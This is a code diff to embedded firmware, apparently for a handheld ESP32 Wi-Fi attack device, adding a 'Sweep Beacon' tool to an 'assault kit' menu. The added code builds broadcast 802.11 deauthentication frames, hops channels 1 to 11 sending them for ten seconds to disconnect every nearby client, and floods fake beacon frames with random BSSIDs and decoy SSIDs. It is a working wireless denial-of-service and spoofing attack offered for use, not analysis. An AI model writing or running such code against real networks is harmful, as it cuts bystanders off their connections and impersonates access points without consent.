@@ -85,6 +85,31 @@ void mopieAssaultKit() {
                 vTaskDelay(55);
             }
         }},
+        {"Sweep Beacon",  "deauth + fake-AP decoy", []() {
+            // Mopie-owned combo: hop ch1-11, deauth everyone, and beacon a decoy
+            // SSID so the zone looks "occupied" by a fake network.
+            uint8_t bssid[6] = {0x02,0,0,0,0,0}, bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, df[26];
+            mopie_build_deauth(df, bssid, bc, 0x0001);
+            tft.fillScreen(bruceConfig.bgColor);
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            tft.drawCentreString("SWEEP BEACON", tftWidth/2, 12, 1);
+            tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
+            tft.drawCentreString("deauth + decoy beacon", tftWidth/2, 34, 1);
+            unsigned long t0 = millis();
+            uint8_t ch = 1;
+            uint32_t frames = 0;
+            while (!check(EscPress) && millis()-t0 < 10000) {
+                frames += (uint32_t)mopie_send_raw(df, sizeof(df), ch, 3);
+                uint8_t beacon[128];
+                char ssid[16]; snprintf(ssid, sizeof(ssid), "cell-%d", ch);
+                size_t bl = mopie_build_beacon(beacon, bssid, ssid);
+                if (bl) mopie_send_raw(beacon, bl, ch, 1);
+                for (int k=1;k<6;k++) bssid[k]=(uint8_t)random(256);
+                ch = (ch % 11) + 1;
+                vTaskDelay(60);
+            }
+            tft.drawCentreString("done: " + String(frames) + " frames", tftWidth/2, 70, 1);
+        }},
     };
     const int N = sizeof(tools)/sizeof(tools[0]);
     int sel = 0;
